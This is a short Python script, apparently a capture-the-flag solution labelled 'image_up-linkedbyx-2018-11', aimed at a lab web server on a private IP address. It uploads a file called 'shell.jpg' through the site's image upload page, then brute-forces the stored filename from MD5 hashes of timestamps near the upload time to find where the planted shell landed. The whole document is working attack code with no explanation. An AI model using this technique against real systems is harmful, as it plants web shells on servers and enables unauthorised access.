'''image_up-linkedbyx-2018-11
'''
import time
import requests
import hashlib

url = 'http://192.168.190.136:20010/'
files = {
  "image":("shell.jpg", open("shell.jpg", "rb"))
}

t = int(time.time())
requests.post(url=url+"index.php?page=upload", files=files)

for i in range(t-20, t+20):
  path = "uploads/"+hashlib.md5("shell"+str(i)).hexdigest() + ".jpg"
  status = requests.get(url=url+path).status_code
  if status == 200:
    print path
    break

